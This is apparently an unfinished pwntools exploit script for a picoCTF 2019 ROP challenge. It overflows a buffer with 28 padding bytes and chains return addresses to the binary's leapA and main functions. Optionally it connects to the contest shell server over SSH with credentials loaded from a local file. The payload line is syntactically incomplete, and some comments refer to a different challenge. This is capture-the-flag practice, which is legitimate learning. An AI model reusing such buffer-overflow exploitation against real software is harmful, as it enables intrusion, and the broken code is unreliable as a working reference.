from pwn import *
import json

LOCAL = True

local_bin = "./rop"
elf = ELF(local_bin)

if(LOCAL):
    p = process(local_bin)
else:
    hostname = "2019shell1.picoctf.com"
    dir = '/problems/handy-shellcode_6_f0b84e12a8162d64291fd16755d233eb'
    with open("/.2019creds.json") as f:
        creds = json.load(f)
        print(creds["user"],creds["pass"])
    s = ssh(host=hostname,user=creds["user"],password=creds["pass"])
    s.set_working_directory(dir)
    p = s.process('sh')
    p.sendline('./vuln')


#Shellcode I got from shellstorm db
#080485e6
leapA = elf.symbols['leapA']
#080485e6 is the start, but need to
# also call with 0xDEADBEEF
leap2 = elf.symbols['leap2']
#08048666 but need to skip check
'''
8048689
8048690
'''
leap3 = elf.symbols['leap3']
display_flag = elf.symbols['display_flag']
#080487c9
main = elf.symbols['main']

# python -c 'print "A" *28 + \xe6\x85\x04\x08'
payload = "A"*28 + p32(leapA) + p32(main) + "A"*28 +
print p.recv()
p.sendline(payload)
print p.recv()
